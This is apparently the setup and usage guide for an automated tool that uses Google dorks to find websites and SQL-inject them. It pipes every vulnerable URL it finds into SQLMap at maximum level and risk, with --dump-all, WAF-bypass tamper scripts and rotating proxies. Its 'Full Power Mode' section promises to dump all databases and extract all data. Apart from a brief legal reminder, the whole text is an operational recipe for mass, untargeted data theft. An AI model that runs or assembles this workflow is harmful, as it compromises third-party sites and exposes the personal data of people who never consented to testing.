# Kali Linux Setup Guide

This guide will help you set up and use the Google Dork SQL Injection Scanner on Kali Linux with full automation and SQLMap integration.

## 🚀 Quick Setup (Automated)

```bash
# Clone the repository
git clone https://github.com/yourusername/Googledorky.git
cd Googledorky

# Run Kali-specific setup script
chmod +x setup_kali.sh
sudo ./setup_kali.sh

# Activate virtual environment
source venv/bin/activate

# Run full automated scan with SQLMap
python main.py --dorks dorks.txt --aggressive --use-sqlmap
```

## 📦 Manual Setup

### 1. Install Dependencies

```bash
# Update package list
sudo apt update

# Install Python and tools
sudo apt install -y python3 python3-pip python3-venv git

# Install SQLMap (required for exploitation)
sudo apt install -y sqlmap

# Install build dependencies
sudo apt install -y build-essential python3-dev libxml2-dev libxslt1-dev
```

### 2. Setup Python Environment

```bash
# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install Python packages
pip install --upgrade pip
pip install -r requirements.txt
```

### 3. Verify Installation

```bash
# Check SQLMap
sqlmap --version

# Check Python packages
pip list | grep -E "requests|beautifulsoup4|selenium"
```

## 🎯 Usage Modes

### Basic Scan
```bash
python main.py --dorks dorks.txt
```

### Aggressive Scan (All Payloads)
```bash
python main.py --dorks dorks.txt --aggressive
```

### Full Automated Scan with SQLMap
```bash
python main.py --dorks dorks.txt --aggressive --use-sqlmap --max-proxies 50
```

### Custom SQLMap Path
```bash
python main.py --dorks dorks.txt --use-sqlmap --sqlmap-path /usr/share/sqlmap/sqlmap.py
```

## 🔥 Full Power Mode

For maximum database extraction:

```bash
python main.py \
  --dorks dorks.txt \
  --aggressive \
  --use-sqlmap \
  --max-proxies 50 \
  --max-urls 100 \
  --output full_scan_results.txt
```

This will:
- ✅ Use comprehensive SQL injection payloads
- ✅ Automatically exploit with SQLMap
- ✅ Dump all databases found
- ✅ Extract all tables and data
- ✅ Use multiple proxies for reliability

## 📊 Understanding Output

After running, you'll find:

1. **results.txt** - Human-readable report
2. **results.json** - Machine-readable data
3. **sqlmap_results/** - SQLMap output files
4. **downloads/** - Database files found

## 🛠️ SQLMap Integration

The tool automatically:
- Detects SQLMap installation
- Runs SQLMap on vulnerable URLs
- Uses aggressive techniques (level 5, risk 3)
- Dumps all databases and tables
- Extracts all data automatically

### SQLMap Options Used

- `--level 5` - Maximum testing level
- `--risk 3` - Maximum risk level
- `--dump-all` - Dump all databases
- `--threads 10` - Fast parallel testing
- `--technique BEUSTQ` - All injection techniques
- `--tamper space2comment,charencode` - WAF bypass

## ⚙️ Advanced Configuration

### Custom Dorks File
```bash
python main.py --dorks my_custom_dorks.txt --aggressive --use-sqlmap
```

### Limit URL Testing
```bash
python main.py --dorks dorks.txt --max-urls 50 --aggressive
```

### Without Proxies (Not Recommended)
```bash
python main.py --dorks dorks.txt --no-proxy --aggressive --use-sqlmap
```

## 🔍 Troubleshooting

### SQLMap Not Found
```bash
# Install SQLMap
sudo apt install sqlmap

# Or specify custom path
python main.py --sqlmap-path /path/to/sqlmap.py
```

### Permission Errors
```bash
# Make scripts executable
chmod +x *.sh *.py

# Run with sudo if needed (for SQLMap)
sudo apt install sqlmap
```

### Import Errors
```bash
# Reinstall dependencies
pip install -r requirements.txt --force-reinstall
```

### Proxy Issues
```bash
# Skip proxy validation for faster start
python main.py --skip-validation --aggressive
```

## 📝 Kali-Specific Tips

1. **Use Root When Needed**: Some SQLMap features may require root
2. **Update Regularly**: `sudo apt update && sudo apt upgrade`
3. **Check Logs**: Monitor `/var/log/` for any issues
4. **Firewall**: Ensure outbound connections are allowed
5. **Resources**: SQLMap can be resource-intensive, monitor system load

## 🎓 Example Workflow

```bash
# 1. Setup
cd ~/Googledorky
source venv/bin/activate

# 2. Edit dorks file
nano dorks.txt

# 3. Run scan
python main.py --dorks dorks.txt --aggressive --use-sqlmap

# 4. Review results
cat results.txt
ls -la sqlmap_results/
ls -la downloads/

# 5. Analyze extracted data
cat sqlmap_results/*.json | jq .
```

## ⚠️ Legal Reminder

- Only use on authorized systems
- Respect rate limits
- Follow bug bounty program rules
- Document all findings properly

## 🚀 Performance Tips

1. **Use Multiple Proxies**: `--max-proxies 50`
2. **Skip Validation**: `--skip-validation` (faster but less reliable)
3. **Limit URLs**: `--max-urls 100` (for testing)
4. **Run Overnight**: Full scans can take hours

Happy hunting! 🐛💰
